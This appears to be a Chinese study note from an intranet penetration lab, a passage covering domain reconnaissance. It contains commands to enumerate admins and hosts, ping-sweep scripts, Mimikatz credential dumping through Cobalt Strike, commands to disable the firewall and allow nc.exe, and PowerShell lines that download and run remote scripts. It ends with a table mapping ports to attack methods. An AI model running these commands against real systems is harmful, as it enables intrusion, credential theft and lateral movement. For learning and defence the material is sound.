<p><code>setspn -T domain -q /</code></p>
<p class='item-img' data-src='image-20230909153349165.png'><img src="image-20230909153349165.png" alt="image-20230909153349165"></p>
<p>这里我估计应该是没有spn吧</p>
<h3 id="3-18-查看域管理员的用户组"><a href="#3-18-查看域管理员的用户组" class="headerlink" title="3-18-查看域管理员的用户组"></a>3.18 查看域管理员的用户组</h3>
<p><code>net group “domain admins” /domain</code></p>
<p class='item-img' data-src='image-20230909153432879.png'><img src="image-20230909153432879.png" alt="image-20230909153432879"></p>
<h3 id="3-19-查询域系统管理员用户组"><a href="#3-19-查询域系统管理员用户组" class="headerlink" title="3-19-查询域系统管理员用户组"></a>3.19 查询域系统管理员用户组</h3>
<p><code>net group &quot;Enterprise admins&quot; /domain</code></p>
<p class='item-img' data-src='image-20230909153514033.png'><img src="image-20230909153514033.png" alt="image-20230909153514033"></p>
<h3 id="3-20-查看域控制器"><a href="#3-20-查看域控制器" class="headerlink" title="3-20-查看域控制器"></a>3.20 查看域控制器</h3>
<p><code>net group &quot;domain controllers&quot; /domain</code></p>
<p class='item-img' data-src='image-20230909153537898.png'><img src="image-20230909153537898.png" alt="image-20230909153537898"></p>
<h3 id="3-21-查看域控制器的机器名"><a href="#3-21-查看域控制器的机器名" class="headerlink" title="3-21-查看域控制器的机器名"></a>3.21 查看域控制器的机器名</h3>
<p><code>nltest /DCLIST:hacker</code></p>
<p class='item-img' data-src='image-20230909153553577.png'><img src="image-20230909153553577.png" alt="image-20230909153553577"></p>
<h3 id="3-22-查看dns缓存"><a href="#3-22-查看dns缓存" class="headerlink" title="3-22-查看dns缓存"></a>3.22 查看dns缓存</h3>
<p><code>ipconfig /displaydns</code></p>
<p class='item-img' data-src='image-20230909153647070.png'><img src="image-20230909153647070.png" alt="image-20230909153647070"></p>
<h3 id="3-23-列域控c盘文件-需要域管理员权限"><a href="#3-23-列域控c盘文件-需要域管理员权限" class="headerlink" title="3-23-列域控c盘文件-需要域管理员权限"></a>3.23 列域控c盘文件(需要域管理员权限)</h3>
<p><code>dir \\WIN7-TEST.hacker.testlab\c$</code></p>
<p>这里不知为何我找不到指定的文件，或许是命令错误，找了半天发现是域名前面应该是两条反斜杠</p>
<p class='item-img' data-src='image-20230909154736190.png'><img src="image-20230909154736190.png" alt="image-20230909154736190"></p>
<h3 id="3-24-查询所有域成员计算机列表"><a href="#3-24-查询所有域成员计算机列表" class="headerlink" title="3-24-查询所有域成员计算机列表"></a>3.24 查询所有域成员计算机列表</h3>
<p><code>net group &quot;domain computers&quot; /domain</code></p>
<p class='item-img' data-src='image-20230909154831401.png'><img src="image-20230909154831401.png" alt="image-20230909154831401"></p>
<h3 id="3-25-获取域信任信息"><a href="#3-25-获取域信任信息" class="headerlink" title="3-25-获取域信任信息"></a>3.25 获取域信任信息</h3>
<p><code>nltest /domain_trusts</code></p>
<p class='item-img' data-src='image-20230909154843289.png'><img src="image-20230909154843289.png" alt="image-20230909154843289"></p>
<h3 id="3-26-获取域内用户的详细信息"><a href="#3-26-获取域内用户的详细信息" class="headerlink" title="3-26-获取域内用户的详细信息"></a>3.26 获取域内用户的详细信息</h3>
<p><code>wmic useraccount get /all</code></p>
<p class='item-img' data-src='image-20230909154900256.png'><img src="image-20230909154900256.png" alt="image-20230909154900256"></p>
<h3 id="3-27-查看存在的用户"><a href="#3-27-查看存在的用户" class="headerlink" title="3-27-查看存在的用户"></a>3.27 查看存在的用户</h3>
<p><code>dsquery user</code></p>
<p class='item-img' data-src='image-20230909155236636.png'><img src="image-20230909155236636.png" alt="image-20230909155236636"></p>
<p>这条命令只能在winserver服务器才能使用</p>
<h3 id="3-28-查询所有计算机名称"><a href="#3-28-查询所有计算机名称" class="headerlink" title="3-28-查询所有计算机名称"></a>3.28 查询所有计算机名称</h3>
<p><code>dsquery computer</code></p>
<p class='item-img' data-src='image-20230909155312203.png'><img src="image-20230909155312203.png" alt="image-20230909155312203"></p>
<h3 id="3-29-攻击主机CMD扫描同网段存活ip"><a href="#3-29-攻击主机CMD扫描同网段存活ip" class="headerlink" title="3-29-攻击主机CMD扫描同网段存活ip"></a>3.29 攻击主机CMD扫描同网段存活ip</h3>
<p>windows</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 扫c段<br>for /L %P in (1,1,254) DO @ping ‐w 1 ‐n 1 192.168.17.%P | findstr &quot;TTL =&quot;<br></code></pre></td></tr></table></figure>
<p>Linux</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>NET=10.168.1.<br><span class="hljs-keyword">for</span> IP <span class="hljs-keyword">in</span> &#123;100..115&#125;<br><span class="hljs-keyword">do</span><br><span class="hljs-keyword">if</span> `ping -c2 -i0.2 -w2 $NET<span class="hljs-variable">$IP</span> &amp;&gt; /dev/null`<br><span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;$NET<span class="hljs-variable">$IP</span> is \033[31mup\033[0m&quot;</span> <br><span class="hljs-keyword">else</span> <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;$NET<span class="hljs-variable">$IP</span> is \033[32mdown\033[0m&quot;</span> <br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
<p>扫b段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">for i in 192.168.&#123;1..254&#125;.&#123;1..254&#125;; do if ping -c 3 -w 3 $i &amp;&gt;/dev/null;then echo $i is alived; fi; done<br></code></pre></td></tr></table></figure>
<h3 id="3-30-PowerView-ps域内信息收集"><a href="#3-30-PowerView-ps域内信息收集" class="headerlink" title="3-30-PowerView-ps域内信息收集"></a>3.30 PowerView.ps域内信息收集</h3>
<p>Invoke-NetView //查域内环境<br>
Invoke-ShareFinder //查共享目录<br>
Invoke-MapDomainTrusts //查看域内信任关系<br>
Get-NetLocalGroup -HostName TARGET(主机名) //查看指定用户的登录时间、所属组情况</p>
<h3 id="3-31-cs信息收集"><a href="#3-31-cs信息收集" class="headerlink" title="3-31-cs信息收集"></a>3.31 cs信息收集</h3>
<h4 id="target组信息的命令"><a href="#target组信息的命令" class="headerlink" title="target组信息的命令"></a>target组信息的命令</h4>
<p>net group \Target<br>
net localgroup \target 组名</p>
<h4 id="获取远程目录"><a href="#获取远程目录" class="headerlink" title="获取远程目录"></a>获取远程目录</h4>
<p>shell dir \target\c$<br>
shell dir /S /B \target\c$\users //递归获取多级目录及文件</p>
<h4 id="cs通过powershell命令获取目录信息"><a href="#cs通过powershell命令获取目录信息" class="headerlink" title="cs通过powershell命令获取目录信息"></a>cs通过powershell命令获取目录信息</h4>
<p>powersehll Invoke-Command -ComputerName target -ScriptBlock{dir c:}<br>
powershell Invoke-Command -ComputerName target -ScriptBlock{net localgroup administrators}</p>
<h4 id="cs通过mimikatz抓取远程哈希值"><a href="#cs通过mimikatz抓取远程哈希值" class="headerlink" title="cs通过mimikatz抓取远程哈希值"></a>cs通过mimikatz抓取远程哈希值</h4>
<p>powershell-import Invoke-Mimikatz.ps1<br>
powershell Invoke-Mimikatz -DumpCreds<br>
powershell Invoke-Mimikatz -Command ‘“privilege::debug” “sekurlsa::logonPasswords full”‘</p>
<h3 id="3-32-防火墙相关"><a href="#3-32-防火墙相关" class="headerlink" title="3-32-防火墙相关"></a>3.32 防火墙相关</h3>
<ol>
<li>
<p>关闭防火墙</p>
<p>Windows Server 2003及之前的版本(admin)：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">netsh firewall set opmode disable<br></code></pre></td></tr></table></figure>
<p>Windows Server 2003之后的版本(admin)：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">netsh advfirewall set allprofiles state off<br></code></pre></td></tr></table></figure>
</li>
<li>
<p>查看防火墙配置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">netsh firewall show config<br></code></pre></td></tr></table></figure>
</li>
</ol>
<p class='item-img' data-src='image-20230909162001555.png'><img src="image-20230909162001555.png" alt="image-20230909162001555"></p>
<ol>
<li>
<p>修改防火墙配置</p>
<p>Windows Server 2003及之前的版本，允许指定程序全部连接：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable<br></code></pre></td></tr></table></figure>
<p>Windows Server 2003之后的版本，情况如下。</p>
<p>允许指定程序进入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\nc.exe&quot;<br></code></pre></td></tr></table></figure>
<p>允许指定程序退出：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C:\nc.exe&quot;<br></code></pre></td></tr></table></figure>
<p>允许3389端口放行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow<br></code></pre></td></tr></table></figure>
<p>自定义防火墙日志的储存位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;<br></code></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="3-33-查询代理配置情况"><a href="#3-33-查询代理配置情况" class="headerlink" title="3-33-查询代理配置情况"></a>3.33 查询代理配置情况</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230909162103233.png'><img src="image-20230909162103233.png" alt="image-20230909162103233"></p>
<h3 id="3-34-查询并开启远程连接服务"><a href="#3-34-查询并开启远程连接服务" class="headerlink" title="3-34-查询并开启远程连接服务"></a>3.34 查询并开启远程连接服务</h3>
<ol>
<li>
<p>查看远程连接端口</p>
<p>0xd3d转换后就是3389</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber<br></code></pre></td></tr></table></figure>
</li>
<li>
<p>在Windows Server 2003中开启3389端口</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;)  call setallowtsconnections 1<br></code></pre></td></tr></table></figure>
<ol start="3">
<li>在Windows Server 2008和Windows Server 2012中开启3389端口</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1<br><br>wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName=&#x27;RDP-Tcp&#x27;) call setuserauthenticationrequired 1<br><br>reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f<br></code></pre></td></tr></table></figure>
<h3 id="3-35-端口扫描"><a href="#3-35-端口扫描" class="headerlink" title="3-35-端口扫描"></a>3.35 端口扫描</h3>
<h4 id="1-telnet端口连接"><a href="#1-telnet端口连接" class="headerlink" title="1-telnet端口连接"></a>1. telnet端口连接</h4>
<p>没有开启的话去“打开或关闭windows功能”开启</p>
<ul>
<li>telnet只用于确认端口是否开启用，不拿来端口扫描</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">telnet &lt;主机&gt; &lt;端口&gt;<br>telnet 192.168.52.138 445<br></code></pre></td></tr></table></figure>
<h4 id="2-PowerSploit-中的Invoke-portscan-ps1脚本"><a href="#2-PowerSploit-中的Invoke-portscan-ps1脚本" class="headerlink" title="2-PowerSploit-中的Invoke-portscan-ps1脚本"></a>2. PowerSploit 中的Invoke-portscan.ps1脚本</h4>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p>
<p>端口扫描利用到工具包中的<code>Portscan.ps1</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">powershell -nop -exec bypass -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;https://github.com/powersploit/Recon/Invoke-Portscan.ps1&#x27;);Invoke-Portscan -Hosts 192.168.17.1/24 -T 4 -ports &#x27;445,1433,8080,80,3389&#x27;&quot;<br><br>// 或者扫描全部的端口：-Ports &quot;1-65535&quot;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230909164333290.png'><img src="image-20230909164333290.png" alt="image-20230909164333290"></p>
<h4 id="3-Nishang中的Invoke-portscan-ps1"><a href="#3-Nishang中的Invoke-portscan-ps1" class="headerlink" title="3-Nishang中的Invoke-portscan-ps1"></a>3. Nishang中的Invoke-portscan.ps1</h4>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p>
<p>该脚本可用于发现主机、解析主机名、扫描端口。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">powershell -nop -exec bypass -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://39.xxx.xxx.210/nishang/Scan/Invoke-PortScan.ps1&#x27;);Invoke-PortScan -StartAddress 192.168.1.1 -EndAddress 192.168.1.255 -ResolveHost -Port &#x27;1-65535&#x27;&quot;<br><br>// -ResolveHost：解析主机名<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230909164401808.png'><img src="image-20230909164401808.png" alt="image-20230909164401808"></p>
<h4 id="4-Nmap扫描"><a href="#4-Nmap扫描" class="headerlink" title="4-Nmap扫描"></a>4. Nmap扫描</h4>
<p>一般通过挂代理，nmap远程扫描</p>
<p>《内网渗透测试：隐藏通讯隧道技术》</p>
<h4 id="5-Metasploit-端口扫描模块"><a href="#5-Metasploit-端口扫描模块" class="headerlink" title="5-Metasploit-端口扫描模块"></a>5. Metasploit 端口扫描模块</h4>
<p>Metasploit中提供了很多内置的扫描模块，使用方便，在侵入内网后设置好路由直接扫即可，有时速度有些慢。几个常用的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">auxiliary/scanner/portscan/tcp<br>auxiliary/scanner/portscan/tcp<br>auxiliary/scanner/portscan/ack  <br></code></pre></td></tr></table></figure>
<h4 id="6-收集域内端口的banner信息"><a href="#6-收集域内端口的banner信息" class="headerlink" title="6-收集域内端口的banner信息"></a>6. 收集域内端口的banner信息</h4>
<p>banner信息表示“欢迎语”，其中会包含一些敏感信息，在banner信息中，可以获取到软件开发商、软件名称、服务类型、版本号等，而版本号信息有时会存在公开的CVE可以利用。获取到版本号后，可以在中查找到对应的CVE编号，并在<a target="_blank" rel="noopener" href="https://www.exploit-db.com/">ExploitDB</a>等平台上面找到相关的利用方式。</p>
<h4 id="获取Banner"><a href="#获取Banner" class="headerlink" title="获取Banner"></a>获取Banner</h4>
<p>扫描到端口后就要获取到其Banner信息，接着就可以在漏洞库里查找poc，这个可以找一下常见的端口的服务来得知</p>
<table>
<thead>
<tr>
<th>端口号</th>
<th>端口说明</th>
<th>攻击技巧</th>
</tr>
</thead>
<tbody>
<tr>
<td>21/22/69</td>
<td>ftp/tftp：文件传输协议</td>
<td>允许匿名上传、下载、爆破、嗅探、溢出和后门</td>
</tr>
<tr>
<td>22</td>
<td>ssh：远程连接</td>
<td>爆破OpenSSH；28个退格</td>
</tr>
<tr>
<td>23</td>
<td>telnet：远程连接</td>
<td>爆破\嗅探、弱口令</td>
</tr>
<tr>
<td>25</td>
<td>smtp：邮件服务</td>
<td>邮件伪造</td>
</tr>
<tr>
<td>53</td>
<td>DNS：域名系统</td>
<td>DNS区域传输\DNS劫持\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙</td>
</tr>
<tr>
<td>67/68</td>
<td>dhcp</td>
<td>劫持\欺骗</td>
</tr>
<tr>
<td>80/443/8080</td>
<td>常见web服务端口</td>
<td>web攻击、爆破、对应服务器版本漏洞</td>
</tr>
<tr>
<td>110</td>
<td>pop3</td>
<td>爆破、嗅探</td>
</tr>
<tr>
<td>139</td>
<td>samba</td>
<td>爆破\未授权访问\远程代码执行</td>
</tr>
<tr>
<td>143</td>
<td>imap</td>
<td>爆破</td>
</tr>
<tr>
<td>161</td>
<td>snmp</td>
<td>爆破</td>
</tr>
<tr>
<td>389</td>
<td>ldap目录访问协议</td>
<td>注入攻击\未授权访问，弱口令</td>
</tr>
<tr>
<td>512/513/514</td>
<td>linux rexec</td>
<td>直接使用rlogin\爆破</td>
</tr>
<tr>
<td>873</td>
<td>rsync</td>
<td>未授权访问\文件上传</td>
</tr>
<tr>
<td>1080</td>
<td>socket</td>
<td>爆破：进行内网渗透</td>
</tr>
<tr>
<td>1352</td>
<td>lotus Domino邮件服务</td>
<td>爆破：弱口令\信息泄漏：源代码</td>
</tr>
<tr>
<td>1433</td>
<td>mssql</td>
<td>爆破：使用系统用户登录\注入攻击\SA弱口令</td>
</tr>
<tr>
<td>1521</td>
<td>oracle</td>
<td>爆破：TNS\注入攻击\反弹shell</td>
</tr>
<tr>
<td>2049</td>
<td>nfs</td>
<td>配置不当</td>
</tr>
<tr>
<td>2181</td>
<td>zookeeper</td>
<td>未授权访问</td>
</tr>
<tr>
<td>3306</td>
<td>mysql</td>
<td>爆破\拒绝服务\注入\提权</td>
</tr>
<tr>
<td>3389</td>
<td>rdp</td>
<td>爆破\Shift后门</td>
</tr>
<tr>
<td>3690</td>
<td>SVN服务</td>
<td>SVN泄露\未授权访问</td>
</tr>
<tr>
<td>4848</td>
<td>glassfish</td>
<td>爆破：控制台弱口令\认证绕过</td>
</tr>
<tr>
<td>5000</td>
<td>sybase/DB2</td>
<td>爆破\注入</td>
</tr>
<tr>
<td>5432</td>
<td>postgresql</td>
<td>缓冲区溢出\注入攻击\爆破：弱口令</td>
</tr>
<tr>
<td>5632</td>
<td>pcanywhere</td>
<td>拒绝服务\代码执行，抓取密码</td>
</tr>
<tr>
<td>5900</td>
<td>vnc</td>
<td>爆破：弱口令\认证绕过</td>
</tr>
<tr>
<td>6379</td>
<td>redis</td>
<td>未授权访问\爆破：弱口令</td>
</tr>
<tr>
<td>7001/7002</td>
<td>weblogic</td>
<td>Java反序列化\控制台弱口令\控制台部署webshell</td>
</tr>
<tr>
<td>8069</td>
<td>zabbix</td>
<td>远程命令执行\SQL注入</td>
</tr>
<tr>
<td>8080/8089</td>
<td>JBoss/Resin/Jetty/Jenkins</td>
<td>反序列化、控制台弱口令</td>
</tr>
<tr>
<td>9090</td>
<td>websphere控制台</td>
<td>爆破：控制台弱口令\Java反序列</td>
</tr>
<tr>
<td>9200/9300</td>
<td>elasticsearch</td>
<td>远程代码执行</td>
</tr>
<tr>
<td>10000</td>
<td>webmin控制面板</td>
<td>弱口令</td>
</tr>
<tr>
<td>11211</td>
<td>memcacache</td>
<td>未授权访问</td>
</tr>
<tr>
<td>27017/27018</td>
<td>mongodb</td>
<td>爆破\未授权访问</td>
</tr>
<tr>
<td>50000</td>
<td>SAP Management Console</td>
<td>远程执行</td>
</tr>
</tbody>
</table>
<h4 id="7-使用Nmap获取banner"><a href="#7-使用Nmap获取banner" class="headerlink" title="7-使用Nmap获取banner"></a>7. 使用Nmap获取banner</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">nmap &lt;IP地址&gt; --script=banner -p &lt;端口/端口范围&gt;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230909165322963.png'><img src="image-20230909165322963.png" alt="image-20230909165322963"></p>
<p>我这里没banner，就借用图片了</p>
<h4 id="8-使用nc获取banner"><a href="#8-使用nc获取banner" class="headerlink" title="8-使用nc获取banner"></a>8. 使用nc获取banner</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">nc -nv &lt;IP地址&gt; &lt;端口&gt;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230909165400049.png'><img src="image-20230909165400049.png" alt="image-20230909165400049"></p>
<h3 id="3-36-存活主机扫描"><a href="#3-36-存活主机扫描" class="headerlink" title="3-36-存活主机扫描"></a>3.36 存活主机扫描</h3>
<h4 id="nbtscan"><a href="#nbtscan" class="headerlink" title="nbtscan"></a>nbtscan</h4>
<p>nbtscan.exe是一个命令行工具，用于扫描本地或远程TCP/IP网络上的开放NetBIOS名称服务器。</p>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/MrAnonymous-1/nbtscan">https://github.com/MrAnonymous-1/nbtscan</a></p>
<p>将nbtscan.exe上传到目标主机上，然后直接输入ip段即可运行扫描：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//扫描一个网段<br>nbtscan-1.0.35.exe 192.168.17.0/24<br>//扫描两个网段<br>nbtscan.exe 192.168.1.0/24 192.168.2.0/24<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230909165437963.png'><img src="image-20230909165437963.png" alt="image-20230909165437963"></p>
<p class='item-img' data-src='image-20230909170645739.png'><img src="image-20230909170645739.png" alt="image-20230909170645739"></p>
<p>参数解释：</p>
<ul>
<li>SHARING：该主机存在正在运行的文件和打印共享服务</li>
<li>DC：该机器可能是域控制器</li>
<li>?：没有识别处该机器的NetBIOS资源</li>
</ul>
<h4 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h4>
<p>基于icmp扫描内网</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.17.%I | findstr &quot;TTL=&quot;<br>//兼容win7<br>for /l %i in (1,1,254) do @ping -a 10.0.1.%i -w 1 -n 1 | find /i &quot;Ping&quot;<br>//扫b段<br>for /l %i in (1,1,254) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i &quot;Ping&quot;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230909170827618.png'><img src="image-20230909170827618.png" alt="image-20230909170827618"></p>
<h4 id="arp-scan-exe"><a href="#arp-scan-exe" class="headerlink" title="arp-scan-exe"></a>arp-scan.exe</h4>
<p>基于arp协议来进行存活性扫描</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/QbsuranAlang/arp-scan-windows-">https://github.com/QbsuranAlang/arp-scan-windows-</a></p>
<p class='item-img' data-src='image-20230909171039223.png'><img src="image-20230909171039223.png" alt="image-20230909171039223"></p>
<p>这个工具的速度比上一个快很多</p>
<h4 id="批处理脚本"><a href="#批处理脚本" class="headerlink" title="批处理脚本"></a>批处理脚本</h4>
<p>这个批处理文件可用于对内网工作组和域内存活主机进行简单的扫描探测，并且支持中英文操作系统。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">@<span class="hljs-built_in">echo</span> off<br>@<span class="hljs-built_in">echo</span>.<br>@FOR /F <span class="hljs-string">&quot;usebackq delims=, &quot;</span> %%J IN (`net view /domain ^|find <span class="hljs-string">&quot;命令成功完成&quot;</span> /v ^|find <span class="hljs-string">&quot;The command completed successfully.&quot;</span> /v ^|find <span class="hljs-string">&quot;命令成功完成&quot;</span> /v ^|find <span class="hljs-string">&quot;--&quot;</span> /v ^|find <span class="hljs-string">&quot;Domain&quot;</span> /v ^|find <span class="hljs-string">&quot;&quot;</span> /v ^|find <span class="hljs-string">&quot;コマンドは正常に終了しました&quot;</span> /v /i`) <span class="hljs-keyword">do</span> (<br>@<span class="hljs-built_in">echo</span> ====== Domain:%%J =========<br>@FOR /F <span class="hljs-string">&quot;usebackq eol=; delims=, &quot;</span> %%i <span class="hljs-keyword">in</span> (`net view /domain:%%J ^|findstr <span class="hljs-string">&quot;\\&quot;</span>`) <span class="hljs-keyword">do</span> (<br>@FOR /F <span class="hljs-string">&quot;usebackq eol=; tokens=1,2,3* delims=\\&quot;</span> %%a <span class="hljs-keyword">in</span> (`@<span class="hljs-built_in">echo</span> %%i`) <span class="hljs-keyword">do</span> (<br>ping %%a -4 -n 1 -w 100 |find /i <span class="hljs-string">&quot;ping&quot;</span> &gt; %%a.txt<br>@FOR /F <span class="hljs-string">&quot;tokens=2 delims=[]&quot;</span> %%b <span class="hljs-keyword">in</span> (%%a.txt) <span class="hljs-keyword">do</span> @<span class="hljs-built_in">echo</span> \\%%a = [%%b]<br>@del /f /q %%a.txt<br>)))<br>@<span class="hljs-built_in">echo</span> ====== Getting IP Complete ======<br></code></pre></td></tr></table></figure>
<h4 id="msf主机存活扫描"><a href="#msf主机存活扫描" class="headerlink" title="msf主机存活扫描"></a>msf主机存活扫描</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">auxiliary/scanner/discovery/udp_sweep<br>auxiliary/scanner/discovery/udp_probe<br>auxiliary/scanner/netbios/nbname<br></code></pre></td></tr></table></figure>
<p>MSF建立会话拿到shell，即可直接执行DOS命令至今进行信息收集。也可以进行直接执行run winenum可以一键收集记录。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">run winenum<br></code></pre></td></tr></table></figure>
<h3 id="3-37-定位域管理员"><a href="#3-37-定位域管理员" class="headerlink" title="3-37-定位域管理员"></a>3.37 定位域管理员</h3>
<h4 id="psloggeddon-exe"><a href="#psloggeddon-exe" class="headerlink" title="psloggeddon-exe"></a>psloggeddon.exe</h4>
<p>下载地址：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon</a></p>
<p>psloggedon.exe可以查看本地登陆的用户和通过本地计算机或远程计算机资源登陆的用户。如果指定的是用户名而不是机器名，psloggedon.exe会搜索网上邻居中的所有计算机，并显示该用户是否已经登录。该工具的某些功能需要管理员权限。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">psloggedon.exe [-] [-l] [-x] [\\computername或username]<br></code></pre></td></tr></table></figure>
<p>查看DC(域控)登录过的机器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">PsLoggedon64.exe -accepteula \\DC<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230909171457744.png'><img src="image-20230909171457744.png" alt="image-20230909171457744"></p>
<p>查看本地登录的用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">PsLoggedon64.exe -accepteula<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230909171518332.png'><img src="image-20230909171518332.png" alt="image-20230909171518332"></p>
<p>查看指定用户登录的计算机</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">PsLoggedon64.exe -accepteula Administrator<br></code></pre></td></tr></table></figure>
